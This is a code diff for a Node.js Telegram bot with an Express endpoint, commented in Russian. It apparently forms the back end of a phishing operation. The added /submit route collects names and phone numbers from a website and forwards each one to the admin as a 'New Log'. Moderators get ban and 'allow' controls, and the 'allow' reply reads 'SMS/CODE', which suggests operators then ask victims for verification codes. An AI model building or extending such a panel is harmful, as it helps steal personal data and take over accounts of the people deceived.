@@ -3,24 +3,26 @@ const TelegramBot = require("node-telegram-bot-api");
 
 const app = express();
 
+app.use(express.json()); // важно для сайта
+
 const token = process.env.BOT_TOKEN;
 const bot = new TelegramBot(token, { polling: true });
 
 console.log("STARTED");
 
-// ===== РОЛИ =====
-const ADMIN_ID = 8035773808; // <-- ТВОЙ ID СЮДА
+// ================== РОЛИ ==================
+const ADMIN_ID = 8035773808; // <-- ВСТАВЬ СВОЙ ID
 
 const mods = [
   111111111, // <-- ID модеров
   222222222
 ];
 
-// ===== ПАМЯТЬ =====
+// ================== ПАМЯТЬ ==================
 const users = {};
 const banned = {};
 
-// ===== СООБЩЕНИЯ =====
+// ================== СООБЩЕНИЯ ==================
 bot.on("message", (msg) => {
   const userId = msg.chat.id;
 
@@ -72,17 +74,16 @@ bot.on("message", (msg) => {
   bot.sendMessage(userId, "бот работает ✅");
 });
 
-// ===== КНОПКИ =====
+// ================== CALLBACK КНОПКИ ==================
 bot.on("callback_query", (q) => {
   const data = q.data;
   const requestId = data.split("_")[1];
-
   const user = users[requestId];
 
   const isAdmin = q.from.id === ADMIN_ID;
   const isMod = mods.includes(q.from.id);
 
-  // ===== БАН =====
+  // бан
   if (data.startsWith("ban")) {
     if (!isAdmin && !isMod) return;
 
@@ -90,7 +91,7 @@ bot.on("callback_query", (q) => {
     return bot.answerCallbackQuery(q.id, { text: "🚫 забанен" });
   }
 
-  // ===== РАЗБАН =====
+  // разбан
   if (data.startsWith("unban")) {
     if (!isAdmin && !isMod) return;
 
@@ -98,14 +99,14 @@ bot.on("callback_query", (q) => {
     return bot.answerCallbackQuery(q.id, { text: "✅ разбанен" });
   }
 
-  // ===== ALLOW =====
+  // allow
   if (data.startsWith("allow")) {
     if (!isAdmin && !isMod) return;
 
     return bot.answerCallbackQuery(q.id, { text: "➡️ SMS/CODE" });
   }
 
-  // ===== АДМИНКА =====
+  // админка
   if (data === "admin_requests") {
     const list = Object.entries(users)
       .map(([id, u]) => `ID ${id} → ${u.userId}`)
@@ -116,21 +117,42 @@ bot.on("callback_query", (q) => {
 
   if (data === "admin_bans") {
     const list = Object.keys(banned).join("\n") || "нет банов";
-
     return bot.sendMessage(q.message.chat.id, list);
   }
 
   if (data === "admin_stats") {
     return bot.sendMessage(
       q.message.chat.id,
-      `Заявки: ${Object.keys(users).length}\nБаны: ${Object.keys(banned).length}`
+      `📊 Статистика:\n\nЛоги: ${Object.keys(users).length}\nБаны: ${Object.keys(banned).length}`
     );
   }
 
   bot.answerCallbackQuery(q.id);
 });
 
-// ===== СЕРВЕР =====
+// ================== САЙТ API ==================
+app.post("/submit", (req, res) => {
+  const data = req.body;
+
+  const requestId = Date.now();
+
+  users[requestId] = {
+    userId: data.userId || "site_user",
+    name: data.name || "no name",
+    phone: data.phone || "no phone"
+  };
+
+  bot.sendMessage(ADMIN_ID,
+    `🔥 Новый Лог 👻\n\n` +
+    `ID: ${requestId}\n` +
+    `Имя: ${data.name}\n` +
+    `Тел: ${data.phone}`
+  );
+
+  res.json({ ok: true, requestId });
+});
+
+// ================== СЕРВЕР ==================
 app.get("/", (req, res) => {
   res.send("ok");
 });
